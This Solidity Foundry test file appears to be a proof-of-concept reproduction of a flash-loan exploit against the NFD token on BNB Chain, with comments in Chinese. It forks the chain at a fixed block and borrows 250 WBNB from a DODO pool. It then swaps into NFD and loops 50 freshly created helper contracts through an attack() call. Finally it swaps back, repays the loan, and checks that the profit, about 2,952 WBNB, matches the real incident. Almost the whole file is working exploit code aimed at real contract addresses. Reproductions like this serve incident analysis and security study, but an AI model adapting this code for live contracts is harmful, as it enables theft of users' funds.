pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";
import "./attackHelper.sol";
// https://www.levi104.com/categories/08-PoC/
contract Attacker is Test {

    IPancakeRouter public pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IERC20 public wbnb = IERC20(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IDVM public DVM_flashloan = IDVM(address(0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7));
    address public usdt = 0x55d398326f99059fF775485246999027B3197955;
    address public nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;
    address constant toAttack = 0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E;

    address public attacker = 0x22C9736D4Fc73A8fa0EB436D2ce919F5849D6fD2;

    function setUp() public {
        vm.createSelectFork("bsc", 21_140_434);

        vm.label(address(pancakeRouter), "pancakeRouter");
        vm.label(address(wbnb), "wbnb");
        vm.label(address(DVM_flashloan), "DVM_flashloan");
        vm.label(address(usdt), "usdt");
        vm.label(address(nfd), "nfd");
        vm.label(address(toAttack), "toAttack");
    }

    function test_Exploit() public {
        console.log("[before flashloan] address(this) WBNB balance",wbnb.balanceOf(address(this)));

        // 进行闪电贷，获得WBNB
        bytes memory data = abi.encode(DVM_flashloan, wbnb, 250 * 1e18);
        // 写接口的时候，flashLoan()没有returns(bool)!!!!!!!!!
        DVM_flashloan.flashLoan(0, 250 * 1e18, address(this), data);
        
        console.log("[after pay back flashloan] address(this) WBNB balance",wbnb.balanceOf(address(this)));
    }

    // 闪电贷回调函数，攻击逻辑写在这里
    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{
        console.log("[get flashloan] address(this) WBNB balance",wbnb.balanceOf(address(this)));

        // 将得到的WBNB换成NFD
        address[] memory path = new address[](3);
        path[0] = address(wbnb);
        path[1] = usdt;
        path[2] = nfd;
        IERC20(wbnb).approve(address(pancakeRouter), type(uint256).max); // 交换之前需要approve给router
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            quoteAmount, 0, path, address(this), block.timestamp
        );

        // 不断创建辅助合约来攻击
        for (uint256 i = 0; i < 50; i++) {
            AttackHelper attackHelper = new AttackHelper();
            uint256 nfdAmount = IERC20(nfd).balanceOf(address(this));
            IERC20(nfd).transfer(address(attackHelper), nfdAmount);
            attackHelper.attack();
        }

        // 查看本攻击合约的NFD余额
        uint256 nfdBalance = IERC20(nfd).balanceOf(address(this));

        // 将NFD换回成WBNB
        path[0] = nfd;
        path[1] = usdt;
        path[2] = address(wbnb);
        IERC20(nfd).approve(address(pancakeRouter), type(uint256).max);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            nfdBalance, 0, path, address(this), block.timestamp
        );

        // 闪电贷还钱
        console.log("[after attack] address(this) WBNB balance", wbnb.balanceOf(address(this)));
        wbnb.transfer(msg.sender, 250 * 1e18);

        // 看看跟攻击事件中的获利是否相同
        assertEq(2952971303206254291601, wbnb.balanceOf(address(this)));
    }

}